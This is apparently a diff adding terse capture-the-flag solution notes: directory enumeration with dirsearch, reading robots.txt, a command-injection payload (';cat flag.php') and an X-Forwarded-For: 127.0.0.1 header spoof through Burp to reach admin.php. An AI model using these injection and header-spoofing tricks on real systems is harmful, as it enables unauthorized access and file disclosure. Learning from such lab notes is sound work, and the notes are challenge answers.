@@ -1,0 +1,16 @@
+Robots
+Dirsearch -u link 
+url/robots.txt
+url/g00d_old_music.php
+
+injector 
+url;cat flag.php
+inspect
+
+address
+Inspect
+url/admin.php
+burp
+url/admin.php
+x-forwarded-for: 127.0.0.1
+send
